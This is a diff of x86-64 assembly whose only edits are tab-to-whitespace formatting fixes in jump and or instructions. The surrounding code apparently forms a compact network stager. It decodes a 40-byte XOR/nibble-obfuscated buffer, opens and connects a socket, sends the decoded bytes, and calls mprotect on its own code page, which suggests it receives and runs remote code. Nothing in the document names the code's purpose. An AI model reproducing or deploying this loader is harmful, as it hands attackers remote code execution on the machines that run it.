@@ -17,7 +17,7 @@ _start:
 	movq	$0x61a026d626617050,%rax
 	pushq	%rax
 	xorl	%ecx,%ecx
-	jmp		.L0
+	jmp	.L0
 .L1:
 	leaq	(%rsp),%r8
 	addq	%rcx,%r8
@@ -25,20 +25,20 @@ _start:
 	movb	%r9b,%r10b
 	shlb	$4,%r10b
 	shrb	$4,%r9b
-	orb		%r10b,%r9b
+	orb	%r10b,%r9b
 	xorb	$0x42,%r9b
 	movb	%r9b,(%r8)
 	addl	$1,%ecx
 .L0:
 	cmpl	$0x28,%ecx
-	jl		.L1
+	jl	.L1
 	movl	$0x29,%eax
 	movl	$0x2,%edi
 	movl	$0x1,%esi
 	xorl	%edx,%edx
 	syscall
 	test	%eax,%eax
-	je		.L2
+	je	.L2
 	movl	%eax,0x58(%rsp)
 	xorq	%rax,%rax
 	movq	%rax,0x40(%rsp)
@@ -51,7 +51,7 @@ _start:
 	movl	$0x10,%edx
 	syscall
 	cmpl	$0xffffffff,%eax
-	je		.L3
+	je	.L3
 	movl	$0x2c,%eax
 	movl	0x58(%rsp),%edi
 	leaq	(%rsp),%rsi
@@ -61,7 +61,7 @@ _start:
 	movl	$0x10,%r9d
 	syscall
 	cmpl	$0x28,%eax
-	jne		.L3
+	jne	.L3
 	movl	$0xa,%eax
 	movl	$0x401000,%edi
 	movl	$0x1000,%esi
@@ -83,7 +83,7 @@ _start:
 	test	%eax,%eax
 	jle 	.L3
 	cmpl	$0,0x38(%rsp)
-	jg		.L4
+	jg	.L4
 .L3:
 	movl	$0x3,%eax
 	movl	0x58(%rsp),%edi
